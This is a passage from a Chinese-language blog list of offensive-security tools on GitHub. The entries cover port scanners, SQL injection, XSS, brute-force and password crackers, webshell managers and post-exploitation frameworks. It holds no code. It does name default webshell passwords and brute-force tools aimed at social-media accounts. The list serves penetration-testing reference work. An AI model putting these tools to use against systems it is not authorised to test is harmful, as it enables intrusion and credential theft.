class="line">https:&#x2F;&#x2F;github.com&#x2F;flipkart-incubator&#x2F;RTA 扫描公司内部所有在线设备, 提供整体安全视图, 标示所有安全异常</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xbug&#x2F;Biu-framework 企业内网基础服务安全扫描框架</span><br></pre></td></tr></table></figure><h3 id="上传漏洞利用"><a href="#上传漏洞利用" class="headerlink" title="上传漏洞利用"></a>上传漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;Arjun 扫描网页, 使用正则表达式爆破查找隐藏的 GET&#x2F;POST 参数</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;3xp10it&#x2F;xupload 用于自动测试上传功能是否可上传 webshell 的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gunnerstahl&#x2F;JQShell py3，CVE-2018-9206 jQuery File Upload 利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;destine21&#x2F;ZIPFileRaider burp 插件，测试 zip 文件上传漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jpiechowka&#x2F;zip-shotgun py，测试 zip 文件上传漏洞</span><br></pre></td></tr></table></figure><h3 id="端口发现服务指纹识别"><a href="#端口发现服务指纹识别" class="headerlink" title="端口发现服务指纹识别"></a>端口发现服务指纹识别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nmap&#x2F;nmap LUA,Nmap 端口扫描器，具有有强大的脚本引擎框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan C,无状态扫描，可以调用 nmap 进行指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap C,无状态扫描，需要用 C 编写扩展模块</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zgrab go，基于 zmap 扫描器进行指纹识别、调度管理，可绕过 CDN</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chichou&#x2F;grab.js 类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;johnnyxmas&#x2F;scancannon shell,联动 masscan 和 nmap</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OffensivePython&#x2F;Nscan 基于 Masscan 和 Zmap 的网络扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wyportmap 调用 nmap 目标端口扫描+系统服务指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;angryip&#x2F;ipscan Angry IP Scanner，跨平台界面化端口扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;EnableSecurity&#x2F;wafw00f WAF 产品指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rbsec&#x2F;sslscan ssl 类型识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;urbanadventurer&#x2F;whatweb web 指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Rvn0xsy&#x2F;FastWhatWebSearch whatweb 工具结果搜索平台</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tanjiti&#x2F;FingerPrint web 应用指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nanshihui&#x2F;Scan-T 网络爬虫式指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ywolf&#x2F;F-MiddlewareScan 中间件扫描服务识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lietdai&#x2F;doom thorn 上实现的分布式任务分发的 ip 端口漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;RASSec&#x2F;RASscan 端口服务扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m3liot&#x2F;shcheck 用于检查 web 服务的 http header 的安全性</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mozilla&#x2F;ssh_scan 服务器 ssh 配置信息扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;18F&#x2F;domain-scan 针对域名及其子域名的资产数据检测／扫描，包括 http&#x2F;https 检测等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ggusoft&#x2F;inforfinder 域名资产收集及指纹识别工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xbug&#x2F;Howl 网络设备 web 服务指纹扫描与检索</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mozilla&#x2F;cipherscan 目标主机服务 ssl 类型识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;medbenali&#x2F;CyberScan 渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP 地址分析等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jekyc&#x2F;wig web 应用信息搜集工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;eldraco&#x2F;domain_analyzer 围绕 web 服务的域名进行信息收集和&quot;域传送&quot;等漏洞扫描，也支持针对背后的服务器端口扫描等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cloudtracer&#x2F;paskto 基于 Nikto 扫描规则的被动式路径扫描以及信息爬虫</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zerokeeper&#x2F;WebEye 快速识别 WEB 服务器类型、CMS 类型、WAF 类型、WHOIS 信息、以及语言框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;n4xh4ck5&#x2F;CMSsc4n CMS 指纹识别</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;HA71&#x2F;WhatCMS CMS 检测和漏洞利用脚本, 基于 Whatcms.org API</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;boy-hack&#x2F;gwhatweb CMS 识别 python gevent 实现</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wpscanteam&#x2F;wpscan 基本算是 word press 下最好用的工具了</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;Wordpresscan 基于 WPScan 以及 WPSeku 的优化版 wordpress 扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;WPSeku 精简的 wordpress 扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rastating&#x2F;wordpress-exploit-framework wordpress 漏洞利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Jamalc0m&#x2F;wphunter php，wordpress 扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateLabs&#x2F;Zoom wordpress 漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;immunIT&#x2F;drupwn Drupal 信息收集与漏洞利用工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;CHYbeta&#x2F;cmsPoc CMS 渗透测试框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chuhades&#x2F;CMS-Exploit-Framework CMS 攻击框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Tuhinshubhra&#x2F;CMSeeK 20 多种 CMS 的基本检测，针对 wp 利用、可定制模块化爆破功能</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Dionach&#x2F;CMSmap 支持 WordPress，Joomla 和 Drupal 扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Moham3dRiahi&#x2F;XAttacker Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;code-scan&#x2F;dzscan 首款集成化的 Discuz 扫描工具</span><br></pre></td></tr></table></figure><h3 id="数据库扫描与爆破"><a href="#数据库扫描与爆破" class="headerlink" title="数据库扫描与爆破"></a>数据库扫描与爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ron190&#x2F;jsql-injection Java 编写的 SQL 注入工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shack2&#x2F;SuperSQLInjectionV1 安恒航牛的一款界面化注入工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sqlmapproject&#x2F;sqlmap sql 注入 sqlmap</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;stamparm&#x2F;DSSS 已用 1,99 行代码实现的 sql 注入漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Hadesy2k&#x2F;sqliv 已用 1,基于搜索引擎的批量 SQL 注入漏洞扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;quentinhardy&#x2F;odat 一款专门用于 Oracle 渗透的很全面的工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m8r0wn&#x2F;enumdb MySQL 和 MSSQL 利用工具后期爆破、搜索数据库并提取敏感信息。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;LoRexxar&#x2F;Feigong 针对各种情况自由变化的 MySQL 注入脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;youngyangyang04&#x2F;NoSQLAttack 一款针对 mongoDB 的攻击工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Neohapsis&#x2F;bbqsql SQL 盲注利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NetSPI&#x2F;PowerUpSQL 基于 Powershell 的 sqlserver 测试框架</span><br><span class="line">http:&#x2F;&#x2F;www.4hou.com&#x2F;system&#x2F;14950.html 利用 PowerUpSQL，渗透测试技巧：绕过 SQL Server 登录触发器限制</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WhitewidowScanner&#x2F;whitewidow 一款数据库扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;stampery&#x2F;mongoaudit MongoDB 审计及渗透工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;torque59&#x2F;Nosql-Exploitation-Framework NoSQL 扫描&#x2F;爆破工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;missDronio&#x2F;blindy MySQL 盲注爆破工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;JohnTroony&#x2F;Blisqy 用于 http header 中的时间盲注爆破工具，仅针对 MySQL&#x2F;MariaDB</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;se55i0n&#x2F;DBScanner 自动扫描内网中常见 sql、no-sql 数据库脚本，包含未授权访问及常规弱口令检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Turr0n&#x2F;firebase 对没有正确配置的 firebase 数据库进行利用</span><br></pre></td></tr></table></figure><h3 id="XSS-跨站脚本检测利用"><a href="#XSS-跨站脚本检测利用" class="headerlink" title="XSS 跨站脚本检测利用"></a>XSS 跨站脚本检测利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;AwesomeXSS XSS Awesome 系列</span><br><span class="line">http:&#x2F;&#x2F;www.xss-payloads.com 很全面的 xss 工具包与资料</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ismailtasdelen&#x2F;xss-payload-list XSS 漏洞 Payload 列表</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;beefproject&#x2F;beef 经典的 xss 利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;samdenty99&#x2F;injectify 类似 beef 的 xss 利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;firesunCN&#x2F;BlueLotus_XSSReceiver 蓝莲花战队为 CTF 打造的 xss 利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NytroRST&#x2F;XSSFuzzer 根据特定标签生成 xss payload</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;evilcos&#x2F;xssor2 余弦写的 xss 利用辅助工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;XSStrike 可识别并绕过 WAF 的 XSS 扫描工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;raz-varren&#x2F;xsshell go,利用 xss 漏洞返回一个 js 交互 shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;JShell 利用 xss 漏洞返回一个 js 交互 shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shawarkhanethicalhacker&#x2F;BruteXSS 一款 XSS 扫描器,可暴力注入参数</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;1N3&#x2F;XSSTracer 小型 XSS 扫描器,也可检测 CRLF、XSS、点击劫持的</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0x584A&#x2F;fuzzXssPHP PHP 版本的反射型 xss 扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;chuhades&#x2F;xss_scan 批量扫描 XSS 的 python 脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BlackHole1&#x2F;autoFindXssAndCsrf 自动化检测页面是否存在 XSS 和 CSRF 漏洞的浏览器插件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shogunlab&#x2F;shuriken 使用命令行进行 XSS 批量检测</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;stamparm&#x2F;DSXS 支持 GET、POST 方式的高效 XSS 扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bsmali4&#x2F;xssfork kali 下无法使用的话，请下载正确的 PhantomJS 到目录 thirdparty&#x2F;phantomjs&#x2F;Linux</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;riusksk&#x2F;FlashScanner flash xss 扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Damian89&#x2F;xssfinder 针对检测网站中的反射 XSS</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BlackHole1&#x2F;WebRtcXSS 自动化利用 XSS 入侵内网</span><br></pre></td></tr></table></figure><h3 id="弱口令扫描爆破"><a href="#弱口令扫描爆破" class="headerlink" title="弱口令扫描爆破"></a>弱口令扫描爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra 支持多种协议方式的破解与爆破，v8 以后就不提供 windows 版本了</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nmap&#x2F;ncrack c，支持多种协议的破解与爆破</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0pn1i9ht&#x2F;F-Scrack ysrc 对各类服务用户名密码爆破的脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TunisianEagles&#x2F;SocialBox 针对 fb、gmail、ins、twitter 的用户名密码爆破的脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lanjelot&#x2F;patator 支持多种协议的爆破，采用模块化设计，使用灵活</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m4ll0k&#x2F;SMBrute 利用 smb 服务进行用户名密码爆破</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;netxfly&#x2F;crack_ssh Go 写的协程版的 ssh\redis\mongodb 弱口令破解</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;Blazy 支持测试 CSRF, Clickjacking, Cloudflare and WAF 的弱口令探测器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Moham3dRiahi&#x2F;XBruteForcer WordPress、Joomla、DruPal、OpenCart、Magento 等 CMS 用户密码爆破</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shengqi158&#x2F;weak_password_detect Linux 下利用 nmap 多线程探测 ssh 弱口令</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ztgrace&#x2F;changeme 弱口令扫描器，不仅支持普通登录页，也支持 ssh、mongodb 等组件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;htpwdScan simple，http 暴力破解、撞库攻击脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;scu-igroup&#x2F;ssh-scanner 联动 nmap、hydra 对 ssh 批量爆破</span><br></pre></td></tr></table></figure><h3 id="密码破解还原"><a href="#密码破解还原" class="headerlink" title="密码破解还原"></a>密码破解还原</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securityxploded.com&#x2F;download.php 各种密码方向安全小工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;bdutro&#x2F;ibm_pw_clear IBM x3550&#x2F;x3560 M3 bios 密码清除重置工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;thehappydinoa&#x2F;iOSRestrictionBruteForce py,实现的 ios 访问限制密码破解工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;hashcat&#x2F;hashcat C,哈希破解</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fireeye&#x2F;gocrack GO,基于 hashcat 3.6.0+的分布式密码破解工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;s3inlc&#x2F;hashtopolis 基于 php 的 hashcat 的分布式破解工具，支持 C#与 python 客户端</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;e-ago&#x2F;bitcracker 首款开源的 BitLocker 密码破解工具</span><br><span class="line">https:&#x2F;&#x2F;www.ru.nl&#x2F;publish&#x2F;pages&#x2F;909282&#x2F;draft-paper.pdf 破解 SSD 下使用 BitLocker 的论文</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;magnumripper&#x2F;JohnTheRipper 已知密文的情况下尝试破解出明文的破解密码软件</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shinnok&#x2F;johnny JohnTheRipper 密码破解的 GUI 界面，理论兼容所有功能，有 windows 界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jmk-foofus&#x2F;medusa 支持的协议会比 hydra 少一点，但是某些速度会快</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MrSqar-Ye&#x2F;wpCrack wordpress hash 破解</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;testsecer&#x2F;Md5Decrypt C#,基于网上 web API 的 MD5 搜索工具</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;s0md3v&#x2F;Hash-Buster 能调用多个 API 进行 hash 破解查询的智能工具</span><br><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-275945-1-1.html ARCHPR Pro4.54 绿色中文破解版。压缩包密码破解，利用“已知明文攻击”破解加密的压缩文件 </span><br></pre></td></tr></table></figure><h3 id="网站管理与-Webshell"><a href="#网站管理与-Webshell" class="headerlink" title="网站管理与 Webshell"></a>网站管理与 Webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.bt.cn 宝塔网站管理系统</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AntSwordProject&#x2F;antSword js,中国蚁剑,插件式开发</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Chora10&#x2F;Cknife java，中国菜刀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;naozibuhao&#x2F;SecQuanCknife java，中国菜刀升级版，增加爆破功能</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;euphrat1ca&#x2F;hatchet 中国大砍刀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;tengzhangchao&#x2F;PyCmd py，一句话木马客户端程序，目前支持 php、jsp，CS 端通信加密</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;epinna&#x2F;weevely3 py,利用特定的一句话脚本对网站进行管理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nil0x42&#x2F;phpsploit py3,利用特定的一句话脚本对网站进行管理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wonderqs&#x2F;Blade py，利用特定的一句话脚本对网站进行管理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;anestisb&#x2F;WeBaCoo perl，利用特定的一句话脚本对网站进行管理</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;keepwn&#x2F;Altman .net 配合 mono，实现的跨平台菜刀</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;k4mpr3t&#x2F;b4tm4n 集成伪造邮件 ddos，bat.php 的 webshell，初始 k4mpr3t</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dotcppfile&#x2F;DAws 过防火墙 webshell，post pass&#x3D;DAws</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;b374k&#x2F;b374k php 网站管理，默认密码 b374k</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wso-shell&#x2F;WSO webshell 的文件管理，可以伪装为 404 界面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;UltimateHackers&#x2F;nano php 小马，附带 py 编写的生成器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rebeyond&#x2F;memShell 一款可以写入 java web server 内存中的 webshell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DXkite&#x2F;freebuf-stream-shell PHP 使用流包装器实现 WebShell。freebuf 上有详细文章</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2799 利用动态二进制加密实现新型一句话木马之客户端篇</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rebeyond&#x2F;Behinder “冰蝎”动态二进制加密网站管理客户端</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2744#toc-8 利用动态二进制加密实现新型一句话木马之 Java 篇</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2758#toc-4 利用动态二进制加密实现新型一句话木马之.NET 篇</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2774#toc-4 利用动态二进制加密实现新型一句话木马之 PHP 篇</span><br></pre></td></tr></table></figure><h3 id="内网拓展后渗透"><a href="#内网拓展后渗透" class="headerlink" title="内网拓展后渗透"></a>内网拓展后渗透</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;OpenWireSec&#x2F;metasploit 后渗透框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;EmpireProject&#x2F;Empire 基于 poweshell 的命令执行框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;TheSecondSun&#x2F;Bashark 纯 Bash 脚本编写的后渗透框架，大鲨鱼</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;JusticeRage&#x2F;FFM py3，拥有下载、上传功能，生成可执行 py 脚本的后门的后渗透框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;DarkSpiritz&#x2F;DarkSpiritz py2,后渗透框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;CrackMapExec 网络测试中的瑞士军刀，包含 impacket、PowerSploit 等多种模块</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;scavenger 对 CrackMapExec 进行二次包装开发进行内网敏感信息扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;jmortega&#x2F;python-pentesting python-pentesting-tool python 安全工具相关功能模块</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xdea&#x2F;tactical-exploitation Python&#x2F;PowerShell 的测试脚本集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit powershell 测试脚本集与开发框架汇总</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;samratashok&#x2F;nishang powershell 脚本集与利用框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellEmpire&#x2F;PowerTools PowerShell 脚本集，停止更新</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;FuzzySecurity&#x2F;PowerShell-Suite PowerShell 脚本集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rvrsh3ll&#x2F;Misc-Powershell-Scripts PowerShell 脚本集</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;redsnarf 窃取哈希，密码解密，偷偷调用猕猴桃等程序，rdp 多方法利用，远程启动 shell，清楚痕迹</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound 用于分析域成员和用用户关系的程序，通过用 powershell 脚本导出域内的 session、computer、group、user 等信息，入库后进行可视化分析可以做到定点攻击。</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;xorrior&#x2F;RemoteRecon 利用 DotNetToJScript 进行截图、key 记录、token 窃取、dll 与恶意代码注入</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SkyLined&#x2F;LocalNetworkScanner 利用浏览器漏洞当对方打开网址时，扫描对方内网信息</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;fdiskyou&#x2F;hunter 调用 Windows API 对内网信息进行搜集很全面</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;0xwindows&#x2F;VulScritp 内网渗透脚本，包括 banner 扫描、端口扫描；phpmyadmin、jenkins 等通用漏洞利用等</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lcatro&#x2F;network_backdoor_scanner 基于网络流量的内网探测框架</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;sowish&#x2F;LNScan 详细的内部网络信息扫描器</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rootlabs&#x2F;nWatch 联动 nmap，并对组织内网进行扫描</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;m8r0wn&#x2F;nullinux 用于 Linux 的内部渗透测试工具，可用于通过 SMB 